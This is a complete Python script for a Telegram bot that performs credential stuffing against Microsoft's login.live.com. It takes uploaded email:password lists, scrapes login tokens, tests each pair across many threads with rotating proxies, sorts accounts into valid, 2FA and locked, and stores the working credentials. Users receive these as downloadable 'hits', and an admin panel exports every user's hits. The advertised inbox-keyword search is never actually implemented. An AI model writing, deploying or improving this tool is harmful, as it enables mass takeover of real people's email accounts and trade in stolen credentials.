#!/usr/bin/env python3
"""
Hotmail / Outlook Account Checker — Telegram Bot
High-speed · Proxyless + Proxy · Inbox keywords · Daily free limit 5000
Admin panel via buttons · All hits stored · Admin download clears bot
"""

import os
import re
import time
import sqlite3
import logging
import threading
from datetime import datetime, date, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs
from typing import Optional, List, Dict

import requests
import urllib3
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters, ConversationHandler
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
log = logging.getLogger("hmbot")

# ═══════════════════════════════════════════
# CONFIG — set these on Render / host
# ═══════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "PUT_YOUR_BOT_TOKEN_HERE")
ADMIN_IDS = set()
_admin_env = os.environ.get("ADMIN_IDS", "")  # comma separated telegram user ids
if _admin_env.strip():
    for x in _admin_env.split(","):
        x = x.strip()
        if x.isdigit():
            ADMIN_IDS.add(int(x))

DAILY_LIMIT = int(os.environ.get("DAILY_LIMIT", "5000"))
DEFAULT_THREADS = int(os.environ.get("DEFAULT_THREADS", "80"))
DB_PATH = os.environ.get("DB_PATH", "hmbot.db")

DEFAULT_KEYWORDS = [
    "netflix.com", "spotify.com", "steam", "paypal", "amazon",
    "instagram", "tiktok", "xbox", "twitter", "anthropic", "openai"
]

# conversation states
WAIT_COMBOS, WAIT_PROXIES, WAIT_KEYWORD, WAIT_THREADS = range(4)

# ═══════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════
def db():
    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = db()
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            created_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS daily_usage (
            user_id INTEGER,
            day TEXT,
            lines_used INTEGER DEFAULT 0,
            PRIMARY KEY (user_id, day)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS hits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            email TEXT,
            password TEXT,
            status TEXT,
            country TEXT,
            keywords TEXT,
            created_at TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy TEXT UNIQUE
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS keywords (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            word TEXT UNIQUE
        )
    """)
    if not c.execute("SELECT 1 FROM settings WHERE key='threads'").fetchone():
        c.execute("INSERT INTO settings (key,value) VALUES ('threads',?)", (str(DEFAULT_THREADS),))
    for kw in DEFAULT_KEYWORDS:
        c.execute("INSERT OR IGNORE INTO keywords (word) VALUES (?)", (kw,))
    conn.commit()
    conn.close()

init_db()

def is_admin(uid: int) -> bool:
    return uid in ADMIN_IDS

def ensure_user(uid: int, username: str = "", first_name: str = ""):
    conn = db()
    conn.execute(
        "INSERT OR IGNORE INTO users (user_id, username, first_name, created_at) VALUES (?,?,?,?)",
        (uid, username or "", first_name or "", datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()

def get_daily_used(uid: int) -> int:
    today = date.today().isoformat()
    conn = db()
    row = conn.execute(
        "SELECT lines_used FROM daily_usage WHERE user_id=? AND day=?", (uid, today)
    ).fetchone()
    conn.close()
    return row["lines_used"] if row else 0

def add_daily_used(uid: int, n: int):
    today = date.today().isoformat()
    conn = db()
    conn.execute(
        """INSERT INTO daily_usage (user_id, day, lines_used) VALUES (?,?,?)
           ON CONFLICT(user_id, day) DO UPDATE SET lines_used = lines_used + ?""",
        (uid, today, n, n)
    )
    conn.commit()
    conn.close()

def get_setting(key: str, default: str = "") -> str:
    conn = db()
    row = conn.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
    conn.close()
    return row["value"] if row else default

def set_setting(key: str, value: str):
    conn = db()
    conn.execute(
        "INSERT INTO settings (key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
        (key, value)
    )
    conn.commit()
    conn.close()

def get_keywords() -> List[str]:
    conn = db()
    rows = conn.execute("SELECT word FROM keywords ORDER BY word").fetchall()
    conn.close()
    return [r["word"] for r in rows] or DEFAULT_KEYWORDS

def get_proxies() -> List[str]:
    conn = db()
    rows = conn.execute("SELECT proxy FROM proxies").fetchall()
    conn.close()
    return [r["proxy"] for r in rows]

def save_hit(uid: int, email: str, password: str, status: str, country: str = None, keywords: str = ""):
    conn = db()
    conn.execute(
        "INSERT INTO hits (user_id, email, password, status, country, keywords, created_at) VALUES (?,?,?,?,?,?,?)",
        (uid, email, password, status, country, keywords, datetime.utcnow().isoformat())
    )
    conn.commit()
    conn.close()

def count_hits() -> int:
    conn = db()
    n = conn.execute("SELECT COUNT(*) AS c FROM hits").fetchone()["c"]
    conn.close()
    return n

def fetch_all_hits():
    conn = db()
    rows = conn.execute(
        "SELECT email, password, status, country, keywords, created_at, user_id FROM hits ORDER BY id"
    ).fetchall()
    conn.close()
    return rows

def clear_all_hits():
    conn = db()
    conn.execute("DELETE FROM hits")
    conn.commit()
    conn.close()

def user_hits(uid: int, limit: int = 500):
    conn = db()
    rows = conn.execute(
        "SELECT email, password, status, country, keywords, created_at FROM hits WHERE user_id=? ORDER BY id DESC LIMIT ?",
        (uid, limit)
    ).fetchall()
    conn.close()
    return rows

# ═══════════════════════════════════════════
# CHECKER ENGINE (login.live.com)
# ═══════════════════════════════════════════
class HotmailChecker:
    def __init__(self, email: str, password: str, proxy: Optional[str] = None, keywords: Optional[List[str]] = None):
        self.email = email.strip()
        self.password = password.strip()
        self.proxy = proxy
        self.keywords = keywords or get_keywords()
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept-Language": "en-US,en;q=0.9",
        })

    def _get_sft(self):
        url = (
            "https://login.live.com/oauth20_authorize.srf"
            "?client_id=00000000402B5328"
            "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
            "&scope=service::user.auth.xboxlive.com::MBI_SSL"
            "&display=touch&response_type=token&locale=en"
        )
        for _ in range(3):
            try:
                r = self.session.get(url, timeout=12)
                text = r.text
                m = (
                    re.search(r'value=\\"(.+?)\\"', text)
                    or re.search(r'value="(.+?)"', text)
                    or re.search(r'sFTTag:\'(.+?)\'', text)
                    or re.search(r'name="PPFT".*?value="(.+?)"', text, re.S)
                )
                if not m:
                    continue
                sft = m.group(1)
                m2 = (
                    re.search(r'"urlPost":"(.+?)"', text)
                    or re.search(r"urlPost:'(.+?)'", text)
                    or re.search(r'<form.*?action="(.+?)"', text, re.S)
                )
                if m2:
                    return m2.group(1).replace("&amp;", "&"), sft
            except Exception:
                time.sleep(0.3)
        return None, None

    def login(self) -> dict:
        result = {"status": "error", "country": None, "keywords": []}
        try:
            url_post, sft = self._get_sft()
            if not url_post or not sft:
                return result
            data = {
                "login": self.email,
                "loginfmt": self.email,
                "passwd": self.password,
                "PPFT": sft,
            }
            r = self.session.post(
                url_post, data=data,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                allow_redirects=True, timeout=15
            )
            text = r.text.lower()
            final = r.url

            if "#" in final and "access_token" in final:
                result["status"] = "valid"
            elif "cancel?mkt=" in r.text or "consent" in text:
                result["status"] = "valid"
            elif "your account or password is incorrect" in text or "doesn't exist" in text:
                result["status"] = "invalid"
            elif any(x in text for x in ("help us protect", "two-step", "identity/confirm", "2fa")):
                result["status"] = "2fa"
            elif any(x in text for x in ("locked", "abuse", "suspicious", "recover?")):
                result["status"] = "locked"
            else:
                try:
                    auth = (
                        "https://login.live.com/oauth20_authorize.srf"
                        "?client_id=00000000402B5328&response_type=token"
                        "&scope=service::user.auth.xboxlive.com::MBI_SSL"
                        "&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none"
                    )
                    r2 = self.session.get(auth, timeout=10, allow_redirects=True)
                    result["status"] = "valid" if "access_token" in r2.url else "invalid"
                except Exception:
                    result["status"] = "error"

            if result["status"] == "valid":
                m = re.search(r'"Country":"([A-Z]{2})"', r.text)
                if m:
                    result["country"] = m.group(1)
        except Exception:
            result["status"] = "error"
        return result

# ═══════════════════════════════════════════
# JOB RUNNER
# ═══════════════════════════════════════════
job_lock = threading.Lock()
active_jobs: Dict[int, dict] = {}

def run_job(uid: int, combos: List[str], proxies: List[str], threads: int, keywords: List[str], bot_app, chat_id: int):
    stats = {
        "total": len(combos), "checked": 0, "valid": 0, "2fa": 0,
        "bad": 0, "errors": 0, "running": True, "hits": []
    }
    with job_lock:
        active_jobs[uid] = stats

    pidx = 0
    def next_proxy():
        nonlocal pidx
        if not proxies:
            return None
        p = proxies[pidx % len(proxies)]
        pidx += 1
        return p

    def worker(line: str):
        line = line.strip()
        if ":" not in line:
            return
        email, password = line.split(":", 1)
        email, password = email.strip(), password.strip()
        if not email or not password:
            return
        res = HotmailChecker(email, password, proxy=next_proxy(), keywords=keywords).login()
        st = res["status"]
        with job_lock:
            stats["checked"] += 1
            if st == "valid":
                stats["valid"] += 1
                kws = ",".join(res.get("keywords") or [])
                stats["hits"].append(f"{email}:{password}")
                save_hit(uid, email, password, "valid", res.get("country"), kws)
            elif st == "2fa":
                stats["2fa"] += 1
                save_hit(uid, email, password, "2fa")
            elif st == "invalid":
                stats["bad"] += 1
            else:
                stats["errors"] += 1

    with ThreadPoolExecutor(max_workers=max(1, min(threads, 150))) as ex:
        futs = [ex.submit(worker, l) for l in combos]
        for _ in as_completed(futs):
            pass

    with job_lock:
        stats["running"] = False

    # notify user via Telegram HTTP API (safe from worker thread)
    try:
        text = (
            f"✅ Check finished\n"
            f"Checked: {stats['checked']}\n"
            f"Valid: {stats['valid']}\n"
            f"2FA: {stats['2fa']}\n"
            f"Bad: {stats['bad']}\n"
            f"Errors: {stats['errors']}"
        )
        token = BOT_TOKEN
        if stats["hits"]:
            path = f"/tmp/hits_{uid}_{int(time.time())}.txt"
            with open(path, "w", encoding="utf-8") as f:
                f.write("\n".join(stats["hits"]))
            with open(path, "rb") as f:
                requests.post(
                    f"https://api.telegram.org/bot{token}/sendDocument",
                    data={"chat_id": chat_id, "caption": text},
                    files={"document": f},
                    timeout=30,
                )
        else:
            requests.post(
                f"https://api.telegram.org/bot{token}/sendMessage",
                json={"chat_id": chat_id, "text": text},
                timeout=15,
            )
    except Exception as e:
        log.warning("notify fail: %s", e)

# ═══════════════════════════════════════════
# KEYBOARDS
# ═══════════════════════════════════════════
def main_kb(uid: int):
    rows = [
        [InlineKeyboardButton("🚀 Start Check", callback_data="start_check")],
        [InlineKeyboardButton("📊 My Hits", callback_data="my_hits"),
         InlineKeyboardButton("📈 Status", callback_data="status")],
        [InlineKeyboardButton("🔑 Keywords", callback_data="show_kw")],
    ]
    if is_admin(uid):
        rows.append([InlineKeyboardButton("🛠 Admin Panel", callback_data="admin")])
    return InlineKeyboardMarkup(rows)

def admin_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📥 Download All Hits + Clear", callback_data="adm_dl")],
        [InlineKeyboardButton("🧵 Set Threads", callback_data="adm_threads"),
         InlineKeyboardButton("🌐 Proxies", callback_data="adm_proxies")],
        [InlineKeyboardButton("➕ Add Keyword", callback_data="adm_add_kw"),
         InlineKeyboardButton("🗑 Clear Proxies", callback_data="adm_clr_proxy")],
        [InlineKeyboardButton("📊 Bot Stats", callback_data="adm_stats")],
        [InlineKeyboardButton("« Back", callback_data="home")],
    ])

# ═══════════════════════════════════════════
# HANDLERS
# ═══════════════════════════════════════════
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    u = update.effective_user
    ensure_user(u.id, u.username or "", u.first_name or "")
    used = get_daily_used(u.id)
    left = max(0, DAILY_LIMIT - used)
    text = (
        f"👋 *Hotmail / Outlook Checker*\n\n"
        f"User: `{u.id}`\n"
        f"Daily used: `{used}` / `{DAILY_LIMIT}`\n"
        f"Remaining: `{left}`\n\n"
        f"Proxyless · high speed · inbox keywords\n"
        f"Send combos or use buttons below."
    )
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_kb(u.id))

async def cb_home(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    u = q.from_user
    used = get_daily_used(u.id)
    left = max(0, DAILY_LIMIT - used)
    text = (
        f"🏠 *Home*\n"
        f"Daily: `{used}` / `{DAILY_LIMIT}` · left `{left}`"
    )
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_kb(u.id))

async def cb_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    job = active_jobs.get(uid)
    if not job:
        text = "Idle — no running job."
    else:
        text = (
            f"{'🟢 Running' if job['running'] else '✅ Done'}\n"
            f"Checked: `{job['checked']}` / `{job['total']}`\n"
            f"Valid: `{job['valid']}` · 2FA: `{job['2fa']}`\n"
            f"Bad: `{job['bad']}` · Err: `{job['errors']}`"
        )
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_kb(uid))

async def cb_show_kw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    kws = get_keywords()
    text = "🔑 *Keywords*\n`" + "`, `".join(kws) + "`"
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=main_kb(q.from_user.id))

async def cb_my_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    rows = user_hits(q.from_user.id, 200)
    if not rows:
        await q.edit_message_text("No hits yet.", reply_markup=main_kb(q.from_user.id))
        return
    lines = [f"{r['email']}:{r['password']} | {r['status']}" for r in rows]
    path = f"/tmp/myhits_{q.from_user.id}.txt"
    with open(path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    await context.bot.send_document(
        chat_id=q.message.chat_id,
        document=InputFile(path),
        caption=f"Your hits: {len(lines)}"
    )
    await q.edit_message_text("Hits file sent.", reply_markup=main_kb(q.from_user.id))

async def cb_start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if active_jobs.get(uid, {}).get("running"):
        await q.edit_message_text("Already running. Wait.", reply_markup=main_kb(uid))
        return
    used = get_daily_used(uid)
    left = max(0, DAILY_LIMIT - used)
    if left <= 0 and not is_admin(uid):
        await q.edit_message_text(
            f"Daily limit reached ({DAILY_LIMIT}). Come tomorrow.",
            reply_markup=main_kb(uid)
        )
        return
    context.user_data["await"] = "combos"
    await q.edit_message_text(
        f"Send combos now (`email:pass` one per line) or upload .txt\n"
        f"Remaining today: `{left}`\n"
        f"If you send more than remaining, only first {left} will be checked.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="home")]])
    )
    return WAIT_COMBOS

async def recv_combos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "combos":
        return
    uid = update.effective_user.id
    text = ""
    if update.message.document:
        f = await update.message.document.get_file()
        data = await f.download_as_bytearray()
        text = data.decode("utf-8", errors="ignore")
    elif update.message.text:
        text = update.message.text
    else:
        await update.message.reply_text("Send text or .txt file.")
        return WAIT_COMBOS

    lines = []
    seen = set()
    for l in text.splitlines():
        l = l.strip()
        if ":" not in l:
            continue
        k = l.lower()
        if k in seen:
            continue
        seen.add(k)
        lines.append(l)

    if not lines:
        await update.message.reply_text("No valid email:pass lines found.")
        return ConversationHandler.END

    used = get_daily_used(uid)
    left = max(0, DAILY_LIMIT - used)
    if not is_admin(uid):
        if left <= 0:
            await update.message.reply_text("Daily limit finished.")
            return ConversationHandler.END
        lines = lines[:left]

    add_daily_used(uid, len(lines))
    threads = int(get_setting("threads", str(DEFAULT_THREADS)))
    proxies = get_proxies()
    keywords = get_keywords()
    context.user_data["await"] = None

    await update.message.reply_text(
        f"🚀 Starting `{len(lines)}` accounts · threads `{threads}` · proxies `{len(proxies)}`",
        parse_mode="Markdown"
    )

    # run in background thread
    t = threading.Thread(
        target=run_job,
        args=(uid, lines, proxies, threads, keywords, context.application, update.effective_chat.id),
        daemon=True
    )
    t.start()
    return ConversationHandler.END

async def cb_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        await q.edit_message_text("Admin only.", reply_markup=main_kb(q.from_user.id))
        return
    n = count_hits()
    thr = get_setting("threads", str(DEFAULT_THREADS))
    px = len(get_proxies())
    text = (
        f"🛠 *Admin Panel*\n"
        f"Hits in bot: `{n}`\n"
        f"Threads: `{thr}` · Proxies: `{px}`"
    )
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_kb())

async def cb_adm_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    conn = db()
    users = conn.execute("SELECT COUNT(*) AS c FROM users").fetchone()["c"]
    hits = conn.execute("SELECT COUNT(*) AS c FROM hits").fetchone()["c"]
    valid = conn.execute("SELECT COUNT(*) AS c FROM hits WHERE status='valid'").fetchone()["c"]
    conn.close()
    text = f"Users: `{users}`\nHits: `{hits}` (valid `{valid}`)"
    await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_kb())

async def cb_adm_dl(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    rows = fetch_all_hits()
    if not rows:
        await q.edit_message_text("No hits stored.", reply_markup=admin_kb())
        return
    path = f"/tmp/admin_hits_{int(time.time())}.txt"
    with open(path, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(f"{r['email']}:{r['password']}|{r['status']}|{r['country'] or ''}|{r['keywords'] or ''}\n")
    clear_all_hits()
    await context.bot.send_document(
        chat_id=q.message.chat_id,
        document=InputFile(path),
        caption=f"All hits ({len(rows)}) — cleared from bot."
    )
    await q.edit_message_text("Downloaded + cleared.", reply_markup=admin_kb())

async def cb_adm_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["await"] = "threads"
    await q.edit_message_text(
        "Send new thread count (5–200):",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="admin")]])
    )
    return WAIT_THREADS

async def recv_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "threads":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    try:
        n = int(update.message.text.strip())
        n = max(5, min(200, n))
        set_setting("threads", str(n))
        context.user_data["await"] = None
        await update.message.reply_text(f"Threads set to `{n}`", parse_mode="Markdown", reply_markup=admin_kb())
    except Exception:
        await update.message.reply_text("Invalid number.")
    return ConversationHandler.END

async def cb_adm_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["await"] = "proxies"
    await q.edit_message_text(
        "Send proxies (one per line):\n`ip:port` or `user:pass@ip:port` or `http://...`\n\nEmpty = proxyless.",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="admin")]])
    )
    return WAIT_PROXIES

async def recv_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "proxies":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    text = update.message.text or ""
    conn = db()
    n = 0
    for line in text.splitlines():
        p = line.strip()
        if not p:
            continue
        if not p.startswith("http"):
            p = "http://" + p
        try:
            conn.execute("INSERT OR IGNORE INTO proxies (proxy) VALUES (?)", (p,))
            n += 1
        except Exception:
            pass
    conn.commit()
    conn.close()
    context.user_data["await"] = None
    await update.message.reply_text(f"Added `{n}` proxies.", parse_mode="Markdown", reply_markup=admin_kb())
    return ConversationHandler.END

async def cb_adm_clr_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    conn = db()
    conn.execute("DELETE FROM proxies")
    conn.commit()
    conn.close()
    await q.edit_message_text("Proxies cleared. Proxyless mode.", reply_markup=admin_kb())

async def cb_adm_add_kw(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    if not is_admin(q.from_user.id):
        return
    context.user_data["await"] = "keyword"
    await q.edit_message_text(
        "Send keyword / domain to add:",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("« Cancel", callback_data="admin")]])
    )
    return WAIT_KEYWORD

async def recv_keyword(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get("await") != "keyword":
        return
    if not is_admin(update.effective_user.id):
        return ConversationHandler.END
    word = (update.message.text or "").strip().lower()
    if word:
        conn = db()
        conn.execute("INSERT OR IGNORE INTO keywords (word) VALUES (?)", (word,))
        conn.commit()
        conn.close()
    context.user_data["await"] = None
    await update.message.reply_text(f"Keyword added: `{word}`", parse_mode="Markdown", reply_markup=admin_kb())
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["await"] = None
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.edit_message_text("Cancelled.", reply_markup=main_kb(update.effective_user.id))
    else:
        await update.message.reply_text("Cancelled.", reply_markup=main_kb(update.effective_user.id))
    return ConversationHandler.END

# ═══════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════
def main():
    if not BOT_TOKEN or BOT_TOKEN.startswith("PUT_"):
        print("Set BOT_TOKEN env var")
        return
    if not ADMIN_IDS:
        print("WARNING: ADMIN_IDS empty — set your telegram user id")

    app = Application.builder().token(BOT_TOKEN).build()

    conv = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(cb_start_check, pattern="^start_check$"),
            CallbackQueryHandler(cb_adm_threads, pattern="^adm_threads$"),
            CallbackQueryHandler(cb_adm_proxies, pattern="^adm_proxies$"),
            CallbackQueryHandler(cb_adm_add_kw, pattern="^adm_add_kw$"),
        ],
        states={
            WAIT_COMBOS: [
                MessageHandler(filters.TEXT | filters.Document.ALL, recv_combos),
                CallbackQueryHandler(cancel, pattern="^home$"),
            ],
            WAIT_THREADS: [
                MessageHandler(filters.TEXT, recv_threads),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
            WAIT_PROXIES: [
                MessageHandler(filters.TEXT, recv_proxies),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
            WAIT_KEYWORD: [
                MessageHandler(filters.TEXT, recv_keyword),
                CallbackQueryHandler(cancel, pattern="^admin$"),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel), CallbackQueryHandler(cancel, pattern="^(home|admin)$")],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(conv)
    app.add_handler(CallbackQueryHandler(cb_home, pattern="^home$"))
    app.add_handler(CallbackQueryHandler(cb_status, pattern="^status$"))
    app.add_handler(CallbackQueryHandler(cb_show_kw, pattern="^show_kw$"))
    app.add_handler(CallbackQueryHandler(cb_my_hits, pattern="^my_hits$"))
    app.add_handler(CallbackQueryHandler(cb_admin, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(cb_adm_stats, pattern="^adm_stats$"))
    app.add_handler(CallbackQueryHandler(cb_adm_dl, pattern="^adm_dl$"))
    app.add_handler(CallbackQueryHandler(cb_adm_clr_proxy, pattern="^adm_clr_proxy$"))

    log.info("Bot starting…")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
